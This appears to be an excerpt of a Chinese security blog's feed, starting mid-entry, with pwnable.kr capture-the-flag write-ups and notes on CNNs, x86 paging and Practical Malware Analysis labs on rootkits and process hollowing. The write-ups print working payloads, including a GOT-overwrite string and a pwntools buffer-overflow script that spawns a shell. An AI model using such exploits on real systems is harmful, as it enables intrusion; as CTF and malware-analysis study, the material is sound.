welcome函数功能是获取一个最大100字节的字符串，然后打印出来。login函数功能是获得用户输入的passcode1和passcode2，判断是否等于338150和13371337。但是这里的scanf函数中没有对变量取地址，这样会使得输入的值保存到passcode1和passcode2指向的地址。login函数中一处调用了fflush(stdin)，它本意是刷新输入句柄，但刷新stdin是c编译器对c语言库的扩展，正好gcc不支持这个所以这个函数调用在这里没作用。查看反汇编 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125.text:08048564.text:08048564 ; =============== S U B R O U T I N E =======================================.text:08048564.text:08048564 ; Attributes: bp-based frame.text:08048564.text:08048564 public login.text:08048564 login proc near ; CODE XREF: main+1Ap.text:08048564.text:08048564 var_10 = dword ptr -10h.text:08048564 var_C = dword ptr -0Ch.text:08048564.text:08048564 000 push ebp.text:08048565 004 mov ebp, esp.text:08048567 004 sub esp, 28h.text:0804856A 02C mov eax, offset format ; &quot;enter passcode1 : &quot;.text:0804856F 02C mov [esp], eax ; format.text:08048572 02C call _printf.text:08048577 02C mov eax, offset aD ; &quot;%d&quot;.text:0804857C 02C mov edx, [ebp+var_10].text:0804857F 02C mov [esp+4], edx.text:08048583 02C mov [esp], eax.text:08048586 02C call ___isoc99_scanf.text:0804858B 02C mov eax, ds:stdin@@GLIBC_2_0.text:08048590 02C mov [esp], eax ; stream.text:08048593 02C call _fflush.text:08048598 02C mov eax, offset aEnterPasscode2 ; &quot;enter passcode2 : &quot;.text:0804859D 02C mov [esp], eax ; format.text:080485A0 02C call _printf.text:080485A5 02C mov eax, offset aD ; &quot;%d&quot;.text:080485AA 02C mov edx, [ebp+var_C].text:080485AD 02C mov [esp+4], edx.text:080485B1 02C mov [esp], eax.text:080485B4 02C call ___isoc99_scanf.text:080485B9 02C mov dword ptr [esp], offset s ; &quot;checking...&quot;.text:080485C0 02C call _puts.text:080485C5 02C cmp [ebp+var_10], 528E6h.text:080485CC 02C jnz short loc_80485F1.text:080485CE 02C cmp [ebp+var_C], 0CC07C9h.text:080485D5 02C jnz short loc_80485F1.text:080485D7 02C mov dword ptr [esp], offset aLoginOk ; &quot;Login OK!&quot;.text:080485DE 02C call _puts.text:080485E3 02C mov dword ptr [esp], offset command ; &quot;/bin/cat flag&quot;.text:080485EA 02C call _system.text:080485EF 02C leave.text:080485F0 000 retn.text:080485F1 ; ---------------------------------------------------------------------------.text:080485F1.text:080485F1 loc_80485F1: ; CODE XREF: login+68j.text:080485F1 ; login+71j.text:080485F1 02C mov dword ptr [esp], offset aLoginFailed ; &quot;Login Failed!&quot;.text:080485F8 02C call _puts.text:080485FD 02C mov dword ptr [esp], 0 ; status.text:08048604 02C call _exit.text:08048604 login endp.text:08048604.text:08048609.text:08048609 ; =============== S U B R O U T I N E =======================================.text:08048609.text:08048609 ; Attributes: bp-based frame.text:08048609.text:08048609 public welcome.text:08048609 welcome proc near ; CODE XREF: main+15p.text:08048609.text:08048609 var_70 = byte ptr -70h.text:08048609 var_C = dword ptr -0Ch.text:08048609.text:08048609 000 push ebp.text:0804860A 004 mov ebp, esp.text:0804860C 004 sub esp, 88h.text:08048612 08C mov eax, large gs:14h.text:08048618 08C mov [ebp+var_C], eax.text:0804861B 08C xor eax, eax.text:0804861D 08C mov eax, offset aEnterYouName ; &quot;enter you name : &quot;.text:08048622 08C mov [esp], eax ; format.text:08048625 08C call _printf.text:0804862A 08C mov eax, offset a100s ; &quot;%100s&quot;.text:0804862F 08C lea edx, [ebp+var_70].text:08048632 08C mov [esp+4], edx.text:08048636 08C mov [esp], eax.text:08048639 08C call ___isoc99_scanf.text:0804863E 08C mov eax, offset aWelcomeS ; &quot;Welcome %s!\n&quot;.text:08048643 08C lea edx, [ebp+var_70].text:08048646 08C mov [esp+4], edx.text:0804864A 08C mov [esp], eax ; format.text:0804864D 08C call _printf.text:08048652 08C mov eax, [ebp+var_C].text:08048655 08C xor eax, large gs:14h.text:0804865C 08C jz short locret_8048663.text:0804865E 08C call ___stack_chk_fail.text:08048663 ; ---------------------------------------------------------------------------.text:08048663.text:08048663 locret_8048663: ; CODE XREF: welcome+53j.text:08048663 08C leave.text:08048664 000 retn.text:08048664 welcome endp.text:08048664.text:08048665.text:08048665 ; =============== S U B R O U T I N E =======================================.text:08048665.text:08048665 ; Attributes: bp-based frame.text:08048665.text:08048665 ; int __cdecl main(int argc, const char **argv, const char **envp).text:08048665 public main.text:08048665 main proc near ; DATA XREF: _start+17o.text:08048665.text:08048665 argc = dword ptr 8.text:08048665 argv = dword ptr 0Ch.text:08048665 envp = dword ptr 10h.text:08048665.text:08048665 000 push ebp.text:08048666 004 mov ebp, esp.text:08048668 004 and esp, 0FFFFFFF0h.text:0804866B 004 sub esp, 10h.text:0804866E 014 mov dword ptr [esp], offset aToddlerSSecure ; &quot;Toddler&apos;s Secure Login System 1.0 beta.&quot;....text:08048675 014 call _puts.text:0804867A 014 call welcome.text:0804867F 014 call login.text:08048684 014 mov dword ptr [esp], offset aNowICanSafelyT ; &quot;Now I can safely trust you that you hav&quot;....text:0804868B 014 call _puts.text:08048690 014 mov eax, 0.text:08048695 014 leave.text:08048696 000 retn.text:08048696 main endp.text:08048696.text:08048696 ; --------------------------------------------------------------------------- 可以看到welcome函数和login函数在同一个堆栈中，name变量大小为100，在堆栈中位置为ebp-0x70，passcode1变量在堆栈中位置为ebp-0x10，两者相距0x60，即96，所以name数组的最后四个字节空间正好是passcode1的值。查看GOT表 123456789101112.got.plt:0804A000 off_804A000 dd offset printf ; DATA XREF: _printfr.got.plt:0804A004 off_804A004 dd offset fflush ; DATA XREF: _fflushr.got.plt:0804A008 off_804A008 dd offset __stack_chk_fail.got.plt:0804A008 ; DATA XREF: ___stack_chk_failr.got.plt:0804A00C off_804A00C dd offset puts ; DATA XREF: _putsr.got.plt:0804A010 off_804A010 dd offset system ; DATA XREF: _systemr.got.plt:0804A014 off_804A014 dd offset __gmon_start__ ; DATA XREF: ___gmon_start__r.got.plt:0804A018 off_804A018 dd offset exit ; DATA XREF: _exitr.got.plt:0804A01C off_804A01C dd offset __libc_start_main.got.plt:0804A01C ; DATA XREF: ___libc_start_mainr.got.plt:0804A020 off_804A020 dd offset __isoc99_scanf ; DATA XREF: ___isoc99_scanfr.got.plt:0804A020 _got_plt ends 我们可以让passcode1的值等于0804a004，因为fflush会在scanf函数之后执行，把passcode1的值写成got表的地址，因为scanf参数没有加地址符，所以会直接把passcode1的值放入栈中，也就是got表的地址，然后执行scanf函数，把我们输入的值写入got表地址所代表的内存空间中。 1最后构造playload=&quot; &apos;a&apos;*96 + &apos;\x04\xa0\x04\x08&apos; +&apos;\xea\x85\x04\x08&apos; &quot;]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr - flag]]></title>
    <url>%2F2021%2F01%2F23%2Fpwnable.kr%20-%20flag%2F</url>
    <content type="text"><![CDATA[题目从题目信息可以看出，这个文件是加壳的。 1xxd flag | tail命令看一下 可以看到是upx壳。 脱壳脱壳后使用IDA查看一下 发现flag。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr - bof]]></title>
    <url>%2F2021%2F01%2F23%2Fpwnable.kr%20-%20bof%2F</url>
    <content type="text"><![CDATA[题目 查看源码 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system(&quot;/bin/sh&quot;); &#125; else&#123; printf(&quot;Nah..\n&quot;); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 根据提示可知该题为栈溢出，利用overflowme这个缓冲区，更改key的值，然后让比较成功，执行shell命令。 使用IDA查看反汇编可以看到，我们只要填充0x2C+8个字节的字符加上关键的0xcafebabe就可以比较成功。 编写Python脚本 123456from pwn import *payload = &apos;\x90&apos;*52+&apos;\xbe\xba\xfe\xca&apos;p = remote(&apos;pwnable.kr&apos;, 9000)p.sendline(payload)p.interactive() 运行脚本]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr - collision]]></title>
    <url>%2F2021%2F01%2F22%2Fpwnable.kr%20-%20collision%2F</url>
    <content type="text"><![CDATA[题目 1连接登录：ssh col@pwnable.kr -p2222（pw:guest） 1查看文件：ls 123456789101112131415161718192021222324252627282930313233//查看col.c文件：cat col.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; //这里累加5个数 &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(&quot;usage : %s [passcode]\n&quot;, argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(&quot;passcode length should be 20 bytes\n&quot;); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; //res与hashcode进行比较 system(&quot;/bin/cat flag&quot;); return 0; &#125; else printf(&quot;wrong passcode.\n&quot;); return 0;&#125; 利用Python进行构造 1./col $(python -c &quot;print &apos;\xe8\x05\xd9\x1d&apos;+&apos;\x01&apos;*16&quot;)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr - fd]]></title>
    <url>%2F2021%2F01%2F22%2Fpwnable.kr%20-%20fd%2F</url>
    <content type="text"><![CDATA[题目 1连接登录：ssh fd@pwnable.kr -p2222（pw:guest） 1查看文件以及权限：ls -al 看到flag文件，但是当前用户fd并没有读权限，所以不能对flag文件直接进行查看。ps：文件权限说明查看fd.c文件关键点是read函数对buf缓冲区的读取必须为“LETMEWIN”。 1234567891011函数原型：ssize_t read( int fd, void*buf, size_t count )参数说明：fd: 是文件描述符, 从command line获取数据时，为0buf: 为读出数据的缓冲区；count: 为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移） atoi()将字符串转换为整数，可以知道输入的字符串为0x1234 转换为10进制就是4660，所以执行./fd 4660，然后根据题目提示输入LETMEWIN就能够得到flag。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[卷积神经网络(CNN)]]></title>
    <url>%2F2020%2F11%2F27%2F%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(CNN)%2F</url>
    <content type="text"><![CDATA[卷积神经网络卷积神经网络（Convolutional Neural Networks, CNN）是一类包含卷积计算且具有深度结构的前馈神经网络（Feedforward Neural Networks），是深度学习（deep learning）的代表算法之一。卷积神经网络具有表征学习（representation learning）能力，能够按其阶层结构对输入信息进行平移不变分类（shift-invariant classification），因此也被称为“平移不变人工神经网络（Shift-Invariant Artificial Neural Networks, SIANN）” 1、卷积层卷积运算的定义如下。 1、单个卷积核：如图所示，我们有一个5x5的图像，我们用一个3x3的卷积核：1 0 10 1 01 0 1来对图像进行卷积操作，步长stride为1，把卷积核与对应的像素做点积，得到3x3的卷积结果。卷积核放在神经网络里，就代表对应的权重（weight)卷积核和图像进行点乘（dot product), 就代表卷积核里的权重单独对相应位置的Pixel进行作用 2、多个卷积核：一张RGB图片，红绿蓝三个分量叠加起来产生了一张真正意义上的的图片，假设上图中的三个输入分量分别对应红绿蓝。Filter W0，Filter W1两个过滤器（卷积核）也是三维的，分别对三个分量的进行卷积操作，再将三个输出叠加在一起形成RGB特征分量。W1_output = 1(-1) +11+10+0(-1)+10+2*1+0(-1)+11+2(-1) =1 W2_output = 21+20+11+11+01+02+01+00+1*1=5 W3_output = 1(-1)+1(-1)+0(-1)+0*2+0(1)+02+10+11+01 = -1 Bias = 0 Final_output =W1output + W2output+W3output+bias= 1+5-1+0 = 5 总结：当卷积层获得输入图片时会先对其尺寸按照设定进行处理，然后第一个卷积核根据步长历遍整张图片中所有的像素点进行矩阵卷积运算提取特征，由此得到了输出图片的第一层，然后下一个卷积核参与到运算中，直至全部卷积核都运算结束，最后一步，把每一张输出图片叠起来的结果就是整个卷积层的输出。卷积层的主要作用：提取图像特征，参数共享，能够大幅减少计算代价。 2、激活函数在神经元中，输入的 inputs 通过加权，求和后，还被作用了一个函数，这个函数就是激活函数。引入激活函数是为了增加神经网络模型的非线性。如果不用激活函数，每一层输出都是上层输入的线性函数，无论神经网络有多少层，输出都是输入的线性组合，这种情况就是最原始的感知机（Perceptron）。激活函数给神经元引入了非线性因素，使得神经网络可以任意逼近任何非线性函数，这样神经网络就可以应用到众多的非线性模型中。在单层神经网络中（感知机 Perceptron），输入和输出计算关系如下：多个神经元之后，计算公式也是类似，如下图：这样的模型就只能处理一些简单的线性数据，而对于非线性数据则很难有效的处理（也可通过组合多个不同线性表示，但这样更加复杂和不灵活），如下图所示：通过在神经网络中加入非线性激励函数后，神经网络就有可能学习到平滑的曲线来实现对非线性数据的处理了，如下图所示：神经网络中激励函数的作用通俗上讲就是将多个线性输入转换为非线性的关系。如果不使用激励函数的话，神经网络的每层都只是做线性变换，即使是多层输入叠加后也还是线性变换。 1、Sigmoid 函数Sigmoid函数时使用范围最广的一类激活函数，具有指数函数的形状，它在物理意义上最为接近生物神经元。其自身的缺陷，最明显的就是饱和性。从函数图可以看到，其两侧导数逐渐趋近于0，杀死梯度。 2、tanh函数tanh是双曲函数中的一个，tanh() 为双曲正切。在数学中，双曲正切 tanh 是由双曲正弦和双曲余弦这两者基本双曲函数推导而来。正切函数时非常常见的激活函数，与Sigmoid函数相比，它的输出均值是0，使得其收敛速度要比Sigmoid快，减少迭代次数。 3、ReLU 函数针对Sigmoid函数和tanh的缺点，提出ReLU函数。线性整流函数（Rectified Linear Unit, ReLU），又称修正线性单元，是一种人工神经网络中常用的激活函数（activation function），通常指代以斜坡函数及其变种为代表的非线性函数。最近几年比较受欢迎的一个激活函数，无饱和区，收敛快，计算简单，有时候会比较脆弱，如果变量的更新太快，还没有找到最佳值，就进入小于零的分段就会使得梯度变为零，无法更新直接死掉了。 详情请见：https://www.cnblogs.com/wj-1314/p/12015278.html 3、池化层池化（Pooling）是卷积神经网络中另一个重要的概念，它实际上是一种形式的降采样。有多种不同形式的非线性池化函数，而其中“最大池化（Max pooling）”是最为常见的。它是将输入的图像划分为若干个矩形区域，对每个子区域输出最大值。直觉上，这种机制能够有效地原因在于，在发现一个特征之后，它的精确位置远不及它和其他特征的相对位置的关系重要。池化层会不断地减小数据的空间大小，因此参数的数量和计算量也会下降，这在一定程度上也控制了过拟合。通常来说，CNN的卷积层之间都会周期性地插入池化层。池化层通常会分别作用于每个输入的特征并减小其大小。当前最常用形式的池化层是每隔2个元素从图像划分出2*2的区块，然后对每个区块中的4个数取最大值。这将会减少75%的数据量。]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CPU两大类]]></title>
    <url>%2F2020%2F11%2F05%2FCPU%E4%B8%A4%E5%A4%A7%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[某一类CPU所支持的指令集合简称为指令集（Instruction Set）。根据指令集的特征，CPU可以划分为两大阵营，即RISC和CISC。 精简指令集计算机（Reduced Instruction Set Computer， RISC）是IBM研究中心的John Cocke博士于1974年最先提出的。其基本思想是通过减少指令的数量和简化指令的格式来优化和提高CPU执行指令的效率。RISC出现后，人们很自然地把与RISC相对的另一类指令集称为复杂指令集计算机（Complex Instruction Set Computer， CISC）。 RISC处理器的典型代表有SPARC处理器、PowerPC处理器、惠普公司的PA-RISC处理器、MIPS处理器、Alpha处理器和ARM处理器等。 CISC处理器的典型代表有x86处理器和DEC VAX-11处理器等。第一款x86处理器是英特尔公司于1978年推出的8086，其后的8088、80286、80386、80486、奔腾处理器及AMD等公司的兼容处理器都是兼容8086的，因此人们把基于该架构的处理器统称为x86处理器。]]></content>
      <categories>
        <category>《软件调试》</category>
      </categories>
      <tags>
        <tag>CPU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分页机制]]></title>
    <url>%2F2020%2F11%2F04%2F%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[分页机制的主要目的是高效地利用内存。按页来组织和管理内存空间，把暂时不用的数据放到外部存储器（通常是硬盘）上。在启用分页机制后，操作系统将线性地址划分为固定大小的页面（4KB、2MB或4MB）。每个页可以被映射到物理内存或外部存储器上的虚拟内存文件中。分页由处理器的控制寄存器的三个标志来控制：1、PG（分页）标志，CR0寄存器的位31，用于启动分页机制。（从intel386处理器开始的所有intel处理器都有这个标志）2、PSE（页尺寸拓展）标志，CR4寄存器的位4，启动物理地址拓展，可以最多寻址64GB物理内存，否则最多寻址4GB物理内存。（在Pentium和Pentium Pro处理器中引入）3、PAE（物理地址拓展）标志，CR4寄存器的位5，用于启用大页面支持，当PAE=1时，大页面为2MB，当PAE=0时，大页面为4MB。（Pentium Pro处理器中引入） 1、页表和页目录1、页目录页目录是一个由32位页目录项（page-directory entries，PDEs）组成是数组。每个页目录占一个4KB的内存页，每个PDE的长度为4字节，因此每个页目录中最多包含1024个PDE。 2、页表页表是用来存放页表表项（page-table entries：PTEs）的线性表。每个页表占一个4KB的内存页，每个PTE的长度为4字节，每个页表中最多包含1024个PTE。PTE的iao高20位代表的是4KB内存页的起始物理地址的高20位，该起始物理地址的低12位假定为0。 3、页目录指针表页目录指针表（page-directory pointer table）包含4个64位的表项，每个表项指向一个页目录，仅用于启用PAE时。启用PAE后，每个PDE和PTE的长度都增大为64位。 2、地址翻译将32位的虚拟地址翻译为32位的物理地址，其过程可以概括如下：1、通过CR3寄存器定位到页目录的起始地址。2、取线性地址的高10位作为索引选取页目录的一个表项（PDE）。3、根据PDE中的页表基地址（取PDE的高20位，低12位为0）定位到页表。4、取线性地址的12位到21位作为索引选取页表的一个表项（PTE）。5、取出PTE中的内存页基地址（PTE的高20位，低12位为0）。6、取线性地址的低12位作为页中偏移与上一步的内存页基地址相加相加得到物理地址。 3、WinDbg观察分页机制1、启动计计算器（calc.exe），输入一串数字（如123654）以便后面观察。2、启动Windbg，附加到计算器程序上开始调试。3、在Windbg的命令区输入x calc!g*命令列出计算器程序中以g开头的所有符号。 101014d90 calc!ghnoNum = &lt;no type information&gt; 4、在Windbg的命令区输入dd calc! gpszNum L1命令，查看该符号地址的内容。 101014db0 000c4d60 5、继续查看地址000c4d60处的内容。可以看到，地址000c4d60处的内容就是我们在计算器中输入的内容（123654）。6、将字符串地址000c4d60翻译为物理地址。虚拟地址000c8868的页目录索引（高10位）为0；页表索引（中间10位）为0011 0001 00，即0xC4；页内偏移为（低12位）1101 0110 0000，即0xD60。7、查看calc.exe的页目录基地址。8、使用!dd命令显示页目录表的内容。第一个表项内容为2587d001 ，其高20位为页表的起始地址的高20位，低12（067）位为页表属性。8、使用!dd命令显示页表的内容。高20位为所在内存页的起始地址的高20位，即0x2b37d000，低12位（067）为内存页属性。9、查看物理地址中的内容。可以看到，虚拟地址000c4d60和物理地址2b37dd60中的内容是一致的。]]></content>
      <categories>
        <category>《软件调试》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>CPU</tag>
        <tag>分页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Rootkit - SSDT Hook]]></title>
    <url>%2F2020%2F10%2F24%2FLab10-02%20Rootkit%20-%20SSDT%20Hook%2F</url>
    <content type="text"><![CDATA[问题用Dependency Walker查看这个可执行文件的导入表，可以看到CloseServiceHandle、CreateServiceA、OpenSCManager和StartServiceA，这说明程序会创建并启动一个服务。这个程序还调用了CreateFile和WriteFile，这说明这个程序会对文件进行读写操作。另外，我们还可以看到LoadResource和SizeOfResource调用，说明这个程序对资源节进行了操作。用Resource Hacker打开这个文件，我们可以看到在资源节中包含了另一个PE文件。接下来我们打开IDA对这个程序进行静态分析。首先我们可以看到，这个程序将资源节中的数据提取出来。然后在C:\Windows\System32下创建了一个名为Mlwx486.sys的文件。将资源节中的数据写入文件中。接下来创建一个服务并启动。在运行之前，我们先启动双机调试，看看虚拟机系统的情况，输入 1Kd&gt;dd KeServiceDescriptorTable KeServiceDescriptorTable是一个指针，用于指向SSDT表。第一行就是SSDT表，其中0x80502b8c是一个函数指针数组，该指针数组保存了所有原生API的函数地址，0x0000011c是数组的大小。最后的0x80503000里面保存的是一个参数个数的数组，与原生API相对应。输入 1Kd&gt;dd 80502b8c 查看SSDT表。接下来运行程序，使用Promom对其进行监控。可以看到程序在系统目录中创建了名为Mlwx486.sys的文件，并且下面还有对于这个文件的写和关闭的操作。对C：盘进行搜索，没有发现这个文件。我们打开命令提示符，使用sc命令查看一下系统中内核驱动程序的状态。可以看到，程序创建的服务还在运行。接下来我们再查看一下SSDT表，看看恶意程序运行后，这个表是否被修改了。为了能够更好地识别被修改的地址，我们再看一下刚才使用lm命令所显示出来的内容。可以看到，正常内核（NT）的地址范围是0x804d8000到0x806d0480。经过对比可以知道，这个位置之前的值是0x80570074，我们使用u命令看看它是什么函数：可以看到，被修改的函数是NtQueryDirectoryFile，它是一个提取文件和目录信息的通用函数，FindFirstFile以及FindNextFile都是调用它来遍历目录结构的。Windows的资源管理器也会利用它来显示文件和目录。如果恶意程序采用Rootkit技术钩取了这个函数，就可以实现文件隐藏的效果。我们可以首先在恶意程序替换的地址，也就是0xf7c9b486的位置下一个断点。然后利用g指令执行到该位置，再单步运行几次。接下来我们使用Resource Hacker提取出资源文件，并且命名为Lab10-02.sys，然后用IDA载入这个文件。我们直接来看一下NtQueryDirectoryFile函数调用的位置。可以看到，程序会对函数的两个参数信息进行比较，首先是FileInformationClass，程序会将其与3进行比较。3表示的是“FileBothDirectoryInformation”，用于目录的遍历，并会返回关于目录内容的详细信息，返回的信息是FILE_BOTH_DIR_INFORMATION结构的。如果不是3，那么程序什么都不会做。如果是3，则会接着判断ReturnSingleEntry是否为0值。只有在是0值的时候，才会执行恶意程序真实的操作，反之什么都不执行。如果这两处的判断都能够通过，程序就会调用RtlCompareMemory函数来比较两个内存块的内容。其中的Source2是字符“Mlwx”，而Source1是“[esi+5Eh]”，查询FILE_BOTH_DIR_INFORMATION结构可以知道，它表示的是文件的名称（FileName）。那么就可以知道，程序其实是在对文件名称进行匹配，如果文件名称的前四个字符是“Mlwx”，那么也就匹配成功了，就会进行文件隐藏的操作。 1、这个程序创建文件了吗？它创建了什么文件？创建了名为Mlwx486.sys的文件。 2、这个程序有内核组件吗？有。 3、这个程序做了些什么？这个程序采用了Rootkit技术来隐藏指定的文件。它使用了SSDT钩子来钩取NtQueryDirectoryFile函数，并隐藏文件目录列表中所有以“Mlwx”为开头的文件。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码行为]]></title>
    <url>%2F2020%2F10%2F20%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA%2F</url>
    <content type="text"><![CDATA[1、下载器和启动器下载器从互联网上下载其他的恶意代码，然后在本地系统中运行。下载器通常会与漏洞利用打包在一起。下载器常用Windows API函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。 1234567HRESULT URLDownloadToFile( LPUNKNOWN pCaller, //控件的接口，如果不是控件则为0 LPCTSTR szURL, //要下载的url地址,不能为空 LPCTSTR szFileName, //下载后保存的文件名 DWORD dwReserved, //保留字段,必需为0 LPBINDSTATUSCALLBACK lpfnCB //下载进度状态回调); 启动器（加载器）是一类可执行文件，用来安装立即运行或者将来秘密执行的恶意代码。 2、后门后门是一种能让攻击者远程访问一个受害者的机器。后门拥有一套通用的功能，例如操作注册表、列举窗口、创建目录、搜索文件，等等。 1、反向shell反向shell是从被感染机器上发起一个连接，它提供攻击者shell访问被感染机器的权限。1、Netcat反向shell2、windows反向shell 2、远程控制工具远程控制工具（RAT）被用来远程管理一台或多台计算机。服务器端运行在一个被植入恶意代码的受害者主机上。客户端作为攻击者远程操作运行命令和控制单元。远程控制工具通常通过如80、443等常用的通信端口。 3、僵尸网络僵尸网络是被感染主机的一个集合。它们由单一实体控制，通常由一个称为僵尸控制器的机器作为服务器。僵尸网络的目标是尽可能地多感染机器，来构建一个更大的僵尸主机网络，从而使僵尸网络传播其他的恶意代码或蠕虫，或者执行分布式拒绝服务攻击。 3、登录凭证窃密器1、等待用户登录以窃取登录凭证的程序2、转储Windows系统中存放信息的程序，例如密码哈希值，程序直接使用它，或者对它进行离线破解。3、击键记录程序 4、存活机制1、Windows注册表恶意程序常用注册表存储它的配置信息、收集系统信息、永久得安装自己。1、AppInit_DLL恶意代码编写者可以通过一个名为AppInit_DLL特殊注册表项来让DLL获得加载。AppInit_DLL中的DLL程序会在进程加载User32.dll时加载。 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost 2、Winlogon Notify恶意代码编写者可以挂钩一个特殊的winlogon事件，如登录、注销、关机以及锁屏，等等。 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ 当winlogon.exe产生一个事件时，Windows系统会检查Notify注册表键来查找处理这个事件的DLL程序。3、SvoHost DLL恶意代码经常作为一个服务安装，但是更多时候作为一个可执行文件使用。安装的恶意代码作为svchost.exe的DLL来存活，这使得恶意代码可以与其他进程混淆，且更像标准的服务。每个svchost.exe实例都包含一组服务，定义在下列注册表中： 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvoHost 服务被定义在下列注册表位置： 1HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName 2、特洛伊木马化系统二进制文件利用这种技术，恶意代码能够修改系统的二进制文件，当被感染的二进制文件下次运行或者加载时，将会强制运行恶意代码。 3、DLL加载顺序劫持DLL加载顺序劫持是一种简单隐蔽的技术，它允许恶意代码编写者在不使用注册表或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序。Windows XP中加载DLL的默认搜索顺序：1、加载应用程序的目录。2、当前目录3、系统目录4、16位子系统的系统目录5、Windows目录6、PATH环境变量里列出的目录 5、提权恶意代码获得访问这些函数的权限的唯一方法是通过设置访问令牌的权限来开启SeDebugPrivilege。在Windows系统中，访问令牌（access token）是一个包含进程安全描述符的对象。SeDebugPrivilege特权作为一个系统级别调试的工具被创建，但是恶意代码编写者用它来获取系统进程拥有的所有权限。默认情况下，SeDebugPrivilege只赋给本地管理员账户，基本可以认为赋予用户SeDebugPrivilege权限就等同于给予他们本地系统账户权限。 6、隐藏它的踪迹————用户态的Rootkit常用来隐藏恶意代码行为的工具被称为RootKit。Rootkit有多种存在形式，但是大部分Rootkit通过修改操作系统内部的功能来工作。这种修改可以使恶意代码的文件、进程、网络连接以及其他资源对其他程序隐藏。 1、IAT HookIAT Hook是用户空间中一种经典的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接。这种方式修改导入地址表（IAT）或者导出地址表（EAT）。 2、Inline HookInline Hook是通过覆盖导入DLL中API函数的代码来实现的，所以它必须等到DLL被加载后才能执行。]]></content>
      <categories>
        <category>《恶意代码分析实战》</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析实战：Lab12-02]]></title>
    <url>%2F2020%2F10%2F18%2F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%EF%BC%9ALab12-02%2F</url>
    <content type="text"><![CDATA[问题首先看一下它的导入函数。由CreateProcessA、GetThreadContext、SetThreadContext可以知道这个程序会创建新的进程，并且修改线程的上下文。ReadProcessMemory和WriteProcessMemory会对进程的内存空间进行读写操作。SizeofResource、LockResource、LoadResource会对资源进行操作。首先我们来看看main函数中对sub_40149D调用，该函数的目的是组合成一个字符串，也就是系统目录中的svchost.exe的路径。下一个函数调用是sub_40132C，可以发现，这里面出现了诸如FindResource、LoadResource、LockResource、SizeOfResource、VirtualAlloc以及memcpy这几个函数。也就是从当前可执行文件的资源段中复制数据到内存中。对函数以及资源文件进行分析可以看出这里是被加密了的，通过观察我们可以看出，这里进行了异或操作，异或数为0x41。通过winhex对数据进行修改可以得到一个PE文件。接下来调用了函数sub_4010EA，我们先看一下CreateProcessA函数的dwCreationFlags这个参数。这个程序里面，它的值是4，表示的是CREATE_SUSPENDED，也就是允许进程被创建，但是先不启动。还可以看到GetThreadContext这个函数，说明这个恶意程序正在访问一个线程的上下文。它的hThread参数与CreateProcessA函数的lpProcessInformation参数位于同一个缓冲区。这也就说明了，这个程序正在访问挂起的进程的上下文。接下来程序会调用位于0x004011E8处的GetProcAdderss，用于获取NtUnmapViewOfSection函数的地址。并且在0x004011FE的位置，将之前获取的ImageBase作为了NtUnmapViewOfSection函数的一个参数入栈。这样一来，NtUnmapViewOfSection就会将新创建的进程的内存空间释放掉，随后可以开始填充恶意代码了。接下来是一个循环复制PE可执行段到这个挂起的进程。 1、这个程序的目的是什么？这个程序的目的是秘密地创建另一个恶意程序。 